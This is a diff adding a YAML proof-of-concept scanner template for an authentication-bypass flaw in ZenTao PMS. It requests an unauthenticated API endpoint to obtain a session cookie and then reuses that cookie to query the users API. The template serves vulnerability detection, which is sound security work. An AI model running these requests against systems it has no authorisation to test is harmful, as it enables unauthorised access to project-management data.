@@ -1,0 +1,41 @@
+name: yaml-poc-easycorp-zentao-pms-idor-CT-1222946
+binding: 39f0a877-74e6-4f5f-90f7-263e9ef2f2d2
+manual: false
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: CT-1222946
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    random_str_0: randomLowercase(20)
+    random_str_1: randomLowercase(20)
+payloads:
+    payloads:
+        path_0:
+            value: |
+                ""
+        path_1:
+            value: |
+                "/zentao"
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: '{{value}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{random_str_0}}&branch={{random_str_1}}'
+        expression: response.status == 200
+        output:
+            cookie: |
+                'zentaosid=(?P<cookie>[a-zA-Z0-9]+)'.submatch(response.headers['Set-Cookie'])['cookie']
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: '{{value}}/api.php/v1/users'
+            headers:
+                Cookie: zentaosid={{cookie}}
+        expression: |
+            response.body_string.contains('no company-browse priv')
+expression: r0() && r1()
